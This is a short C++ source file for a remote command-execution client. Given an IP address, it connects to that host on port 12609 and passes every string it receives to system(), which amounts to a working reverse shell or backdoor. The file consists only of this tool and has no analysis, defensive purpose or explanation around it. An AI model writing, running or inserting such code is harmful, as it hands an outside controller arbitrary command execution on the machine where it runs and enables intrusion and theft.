#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <cstring>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {

  if(argc != 2) {
    std::cout << "requires ip target" << std::endl;
    return 1;
  }

  std::string target_address = argv[1];
  system("clear");

  int client_socket = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in server_address;
  server_address.sin_port = htons(12609);
  server_address.sin_family = AF_INET;
  
  inet_pton(AF_INET, target_address.c_str(), &server_address.sin_addr);

  int connection = connect(client_socket, (struct sockaddr*) &server_address, sizeof(server_address));
  if(connection < 0) { std::cout << "not connected" << std::endl; close(client_socket); return 1;};

  while(true) {
    char buffer[1024] = {0};
    int recieving = recv(client_socket, buffer, sizeof(buffer), 0);
    if(strcmp(buffer, "kill") == 0) {
      exit(0);
    }
    system(buffer);
  }

  close(client_socket);

}
